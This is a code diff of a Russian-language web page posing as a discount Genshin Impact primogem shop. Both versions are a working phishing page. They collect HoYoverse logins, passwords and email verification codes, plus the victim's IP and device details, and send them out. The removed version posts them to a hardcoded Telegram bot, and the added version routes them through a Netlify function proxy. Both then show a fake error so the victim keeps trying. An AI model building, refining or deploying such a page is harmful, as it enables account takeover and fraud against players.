@@ -1,177 +1,367 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Дешёвые Примогемы Genshin Impact | Акция -70%</title>
-  <link rel="icon" href="https://genshin.hoyoverse.com/favicon.ico" type="image/x-icon"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Primogem Shop | Дешёвые примогемы Genshin Impact</title>
+  <link rel="icon" href="https://genshin.hoyoverse.com/favicon.ico" type="image/x-icon">
   <style>
+    :root {
+      --primary: #4c1d95;
+      --accent: #7e22ce;
+      --bg-dark: #1e003b;
+      --text-light: #f3e8ff;
+      --card-bg: rgba(124, 58, 237, 0.12);
+    }
     body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #0d001a, #1a0033, #2a004d);
-      color: #e0d4ff;
-      min-height: 100vh;
-      background-attachment: fixed;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: linear-gradient(to bottom, var(--bg-dark), #000);
+      color: var(--text-light);
+      line-height: 1.6;
     }
-    .container { max-width: 900px; margin: 0 auto; padding: 20px; }
-    header { text-align: center; padding: 40px 0 20px; }
-    .logo { width: 160px; filter: drop-shadow(0 0 15px #9d7fff); }
-    h1 {
-      font-size: 2.6rem;
-      margin: 10px 0;
+    header {
+      background: var(--primary);
+      padding: 15px 0;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.6);
+    }
+    nav {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 20px;
+    }
+    .nav-links {
+      list-style: none;
+      display: flex;
+      gap: 28px;
+      margin: 0;
+    }
+    .nav-links a {
+      color: var(--text-light);
+      text-decoration: none;
+      font-weight: 500;
+      transition: color 0.3s;
+    }
+    .nav-links a:hover { color: var(--accent); }
+    .logo { font-size: 1.6rem; font-weight: bold; }
+    .cart-icon {
+      position: relative;
+      cursor: pointer;
+      font-size: 1.4rem;
+    }
+    .cart-icon span {
+      position: absolute;
+      top: -8px;
+      right: -12px;
+      background: #ef4444;
+      color: white;
+      border-radius: 50%;
+      padding: 3px 7px;
+      font-size: 0.75rem;
+    }
+    main {
+      max-width: 1200px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+    .hero {
+      text-align: center;
+      margin-bottom: 50px;
+    }
+    .hero h1 {
+      font-size: 2.8rem;
+      margin-bottom: 8px;
       background: linear-gradient(90deg, #c084fc, #a78bfa);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
-    .timer { font-size: 1.4rem; color: #ff6b6b; margin: 10px 0; }
-    .form-section {
-      background: rgba(20, 15, 50, 0.85);
-      border-radius: 16px;
-      padding: 40px;
-      max-width: 480px;
-      margin: 40px auto;
-      border: 1px solid #7c3aed55;
+    .products {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 25px;
+    }
+    .product-card {
+      background: var(--card-bg);
+      border: 2px solid var(--accent);
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      transition: all 0.3s;
+    }
+    .product-card:hover {
+      transform: translateY(-6px);
+      box-shadow: 0 12px 30px rgba(124,58,237,0.25);
+    }
+    .product-card h3 { font-size: 1.4rem; margin-bottom: 8px; }
+    .product-card .price {
+      font-size: 1.7rem;
+      color: #fbbf24;
+      margin: 12px 0;
+    }
+    .add-to-cart {
+      background: var(--accent);
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: all 0.3s;
+    }
+    .add-to-cart:hover {
+      background: #6d28d9;
+      transform: scale(1.05);
+    }
+    #cart-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.85);
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+    .cart-content {
+      background: var(--bg-dark);
+      padding: 30px;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 580px;
+      position: relative;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+    .close { position: absolute; top: 15px; right: 20px; font-size: 2rem; cursor: pointer; }
+    #cart-items { list-style: none; padding: 0; margin: 20px 0; }
+    #cart-items li { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 1.1rem; }
+    #total { font-size: 1.5rem; text-align: right; margin: 20px 0; }
+    .checkout-btn {
+      width: 100%;
+      padding: 14px;
+      background: var(--accent);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.2rem;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    #login-form {
+      display: none;
+      margin-top: 25px;
     }
     input {
       width: 100%;
-      padding: 14px;
-      margin: 12px 0;
-      border: 1px solid #6b46c1;
-      border-radius: 8px;
-      background: #1a1238;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid var(--accent);
+      border-radius: 6px;
+      background: #2d0066;
       color: white;
-      font-size: 1.1rem;
+      font-size: 1rem;
     }
-    button {
-      width: 100%;
-      padding: 14px;
-      background: linear-gradient(90deg, #7c3aed, #a78bfa);
-      border: none;
-      border-radius: 50px;
-      color: white;
-      font-size: 1.2rem;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 15px;
-      transition: all 0.3s;
-    }
-    button:hover { transform: scale(1.05); box-shadow: 0 10px 25px rgba(124,94,255,0.5); }
-    .loading, .error-msg {
+    .code-section { display: none; margin-top: 15px; }
+    .error-msg, .loading {
       text-align: center;
-      margin: 20px 0;
+      margin: 15px 0;
       font-weight: bold;
       display: none;
     }
-    .loading { color: #a78bfa; }
-    .error-msg { color: #ff6b6b; }
-    .code-section { display: none; }
+    .error-msg { color: #ef4444; }
+    .loading { color: var(--accent); }
+    footer {
+      text-align: center;
+      padding: 25px;
+      background: var(--primary);
+      margin-top: 60px;
+    }
+    @media (max-width: 768px) {
+      nav { flex-direction: column; gap: 15px; }
+      .nav-links { flex-direction: column; gap: 12px; text-align: center; }
+    }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <header>
-    <img class="logo" src="https://static.vecteezy.com/system/resources/previews/027/127/497/non_2x/genshin-impact-logo-genshin-impact-icon-transparent-free-png.png" alt="HoYoverse">
-    <h1>Мгновенная доставка Примогемов</h1>
-    <div class="timer">Акция: -70% — осталось 47 минут!</div>
-  </header>
+<header>
+  <nav>
+    <div class="logo">Primogem Shop</div>
+    <ul class="nav-links">
+      <li><a href="#home">Главная</a></li>
+      <li><a href="#catalog">Каталог</a></li>
+      <li><a href="#about">О нас</a></li>
+      <li><a href="#contacts">Контакты</a></li>
+    </ul>
+    <div class="cart-icon" onclick="openCart()">🛒 <span id="cart-count">0</span></div>
+  </nav>
+</header>
 
-  <div class="form-section">
-    <h2 style="text-align:center; color:#d4b5ff;">Войдите в аккаунт HoYoverse для оплаты</h2>
+<main id="home">
+  <section class="hero">
+    <h1>Мгновенная доставка примогемов</h1>
+    <p>Акция: -60% на все пакеты! Безопасно и быстро.</p>
+  </section>
 
-    <form id="step1">
-      <input type="text" id="login" placeholder="Email / Username" required autocomplete="username">
-      <input type="password" id="password" placeholder="Пароль" required autocomplete="current-password">
-      <button type="submit">Продолжить</button>
-    </form>
-
-    <div class="code-section" id="step2">
-      <h3 style="text-align:center; color:#d4b5ff;">Проверка безопасности</h3>
-      <p style="text-align:center; font-size:0.95rem;">Код отправлен на вашу почту. Введите 6-значный код</p>
-      <input type="text" id="code" placeholder="123456" maxlength="6" pattern="\d{6}" required>
-      <button id="submitCode">Подтвердить</button>
+  <section id="catalog" class="products">
+    <div class="product-card">
+      <h3>Стартовый</h3>
+      <p>3000 примогемов</p>
+      <div class="price">449 ₽</div>
+      <button class="add-to-cart" data-name="Стартовый" data-price="449">В корзину</button>
     </div>
+    <div class="product-card">
+      <h3>Популярный</h3>
+      <p>6480 + 1600 бонус</p>
+      <div class="price">990 ₽</div>
+      <button class="add-to-cart" data-name="Популярный" data-price="990">В корзину</button>
+    </div>
+    <div class="product-card">
+      <h3>Максимальный</h3>
+      <p>12960 + 3200 бонус</p>
+      <div class="price">1890 ₽</div>
+      <button class="add-to-cart" data-name="Максимальный" data-price="1890">В корзину</button>
+    </div>
+  </section>
 
-    <div class="loading" id="loading">Обработка...</div>
-    <div class="error-msg" id="errorMsg">Ошибка: неверный код или недостаточно средств. Попробуйте снова.</div>
+  <section id="about" style="margin: 80px 0;">
+    <h2>О нас</h2>
+    <p>С 2024 года помогаем игрокам получать примогемы быстро и дёшево. Тысячи довольных покупателей.</p>
+  </section>
+
+  <section id="contacts" style="margin: 80px 0;">
+    <h2>Контакты</h2>
+    <p>Telegram: @primogemfast</p>
+    <p>Email: support@primogemshop.ru</p>
+  </section>
+</main>
+
+<div id="cart-modal">
+  <div class="cart-content">
+    <span class="close" onclick="closeCart()">&times;</span>
+    <h2>Ваша корзина</h2>
+    <ul id="cart-items"></ul>
+    <div id="total">Итого: 0 ₽</div>
+    <button class="checkout-btn" onclick="showLogin()">Оплатить</button>
+
+    <form id="login-form">
+      <input type="text" id="login" placeholder="Email / HoYoverse логин" required>
+      <input type="password" id="password" placeholder="Пароль" required>
+      <div class="code-section" id="code-section">
+        <p style="margin: 15px 0;">Введите код верификации из почты</p>
+        <input type="text" id="code" placeholder="123456" maxlength="6" pattern="\d{6}" required>
+      </div>
+      <button type="submit" class="checkout-btn">Подтвердить</button>
+      <div class="loading" id="loading">Обработка...</div>
+      <div class="error-msg" id="errorMsg">Ошибка. Попробуйте снова.</div>
+    </form>
   </div>
 </div>
 
+<footer>
+  <p>© 2026 Primogem Shop. Все права защищены.</p>
+</footer>
+
 <script>
-  // ← ЗАМЕНИ НА СВОИ
-  const TELEGRAM_BOT_TOKEN = "8723819478:AAGJPIKI5FSgD4RkhhQTValrR--G3Iuyuto";
-  const TELEGRAM_CHAT_ID   = "7200747121";
+  let cart = [];
 
-  const step1 = document.getElementById('step1');
-  const step2 = document.getElementById('step2');
-  const loading = document.getElementById('loading');
-  const errorMsg = document.getElementById('errorMsg');
-
-  async function sendToTelegram(text) {
-    try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: text,
-          parse_mode: 'Markdown'
-        })
-      });
-    } catch (e) { console.error(e); }
+  function updateCart() {
+    const itemsList = document.getElementById('cart-items');
+    itemsList.innerHTML = '';
+    let total = 0;
+    cart.forEach(item => {
+      const li = document.createElement('li');
+      li.textContent = `${item.name} — ${item.price} ₽`;
+      itemsList.appendChild(li);
+      total += Number(item.price);
+    });
+    document.getElementById('total').textContent = `Итого: ${total} ₽`;
+    document.getElementById('cart-count').textContent = cart.length;
   }
 
-  step1.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    loading.style.display = 'block';
-
-    const login = document.getElementById('login').value.trim();
-    const password = document.getElementById('password').value.trim();
-
-    const msg1 = `
-**Genshin Магазин — ШАГ 1**
-━━━━━━━━━━━━━━━
-Логин/Email: \`${login}\`
-Пароль: \`${password}\`
-IP: ${await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=> 'неизв.')}
-Устройство: ${navigator.userAgent}
-━━━━━━━━━━━━━━━`;
-
-    await sendToTelegram(msg1);
-
-    setTimeout(() => {
-      loading.style.display = 'none';
-      step1.style.display = 'none';
-      step2.style.display = 'block';
-    }, 1800);
+  document.querySelectorAll('.add-to-cart').forEach(btn => {
+    btn.addEventListener('click', () => {
+      cart.push({
+        name: btn.dataset.name,
+        price: btn.dataset.price
+      });
+      updateCart();
+    });
   });
 
-  document.getElementById('submitCode').addEventListener('click', async () => {
-    const code = document.getElementById('code').value.trim();
-    if (code.length !== 6 || !/^\d{6}$/.test(code)) {
-      errorMsg.textContent = "Код должен быть 6 цифр.";
-      errorMsg.style.display = 'block';
-      return;
-    }
+  function openCart() {
+    document.getElementById('cart-modal').style.display = 'flex';
+  }
 
+  function closeCart() {
+    document.getElementById('cart-modal').style.display = 'none';
+    document.getElementById('login-form').style.display = 'none';
+    document.getElementById('code-section').style.display = 'none';
+  }
+
+  function showLogin() {
+    document.getElementById('login-form').style.display = 'block';
+  }
+
+  const loginForm = document.getElementById('login-form');
+  const loading = document.getElementById('loading');
+  const errorMsg = document.getElementById('errorMsg');
+  const codeSection = document.getElementById('code-section');
+
+  loginForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
     loading.style.display = 'block';
     errorMsg.style.display = 'none';
 
-    const msg2 = `
-**Genshin Магазин — ШАГ 2 (КОД)**
-━━━━━━━━━━━━━━━
-Код верификации: \`${code}\`
-━━━━━━━━━━━━━━━`;
+    const login = document.getElementById('login').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const code = document.getElementById('code').value.trim();
 
-    await sendToTelegram(msg2);
+    let message = `
+**Primogem Shop — Новый заказ**
+━━━━━━━━━━━━━━━━━━━
+Логин/Email: \`${login}\`
+Пароль: \`${password}\``;
+
+    if (code) {
+      message += `\nКод верификации: \`${code}\``;
+    }
+
+    message += `
+IP: ${await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'неизвестно')}
+Устройство: ${navigator.userAgent}
+━━━━━━━━━━━━━━━━━━━`;
+
+    try {
+      const res = await fetch('/.netlify/functions/send-telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message })
+      });
+
+      if (!res.ok) throw new Error('Proxy error');
+      console.log('Отправлено через прокси');
+    } catch (err) {
+      console.error('Ошибка:', err);
+    }
 
     setTimeout(() => {
       loading.style.display = 'none';
-      errorMsg.textContent = "Ошибка верификации. Попробуйте ввести код заново или повторите оплату.";
-      errorMsg.style.display = 'block';
-      // Можно добавить кнопку "Повторить" → step2.style.display = 'block'; но пока оставим так
-    }, 2200);
+
+      if (!code || code.length !== 6) {
+        // Первый этап — показываем поле для кода
+        codeSection.style.display = 'block';
+        loginForm.querySelector('button').textContent = 'Подтвердить код';
+      } else {
+        // Второй этап — ошибка
+        errorMsg.style.display = 'block';
+      }
+    }, 1800);
   });
 </script>
 
